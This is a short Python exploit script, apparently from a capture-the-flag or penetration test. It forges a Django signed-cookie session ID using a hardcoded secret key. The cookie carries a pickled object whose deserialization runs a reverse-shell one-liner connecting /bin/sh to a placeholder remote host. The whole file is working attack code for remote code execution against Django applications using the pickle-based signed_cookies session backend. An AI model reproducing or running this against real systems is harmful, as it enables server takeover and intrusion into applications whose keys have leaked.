from django.core.signing import TimestampSigner, b64_encode
from django.utils.encoding import force_bytes
import pickle
import os
import requests

class PickleRCE(object):
    def __reduce__(self):
        return (os.system,(f"""python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxxxx",xxxxx));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'""",))

SECRET_KEY = 'wr`BQcZHs4~}EyU(m]`F_SL^BjnkH7"(S3xv,{sp)Xaqg?2pj2=hFCgN"CR"UPn4'

def rotten_cookie():
    key = force_bytes(SECRET_KEY)
    salt = 'django.contrib.sessions.backends.signed_cookies'
    base64d = b64_encode(pickle.dumps(PickleRCE())).decode()
    return TimestampSigner(key, salt=salt).sign(base64d)

forge_sessionid = rotten_cookie()
print(forge_sessionid)
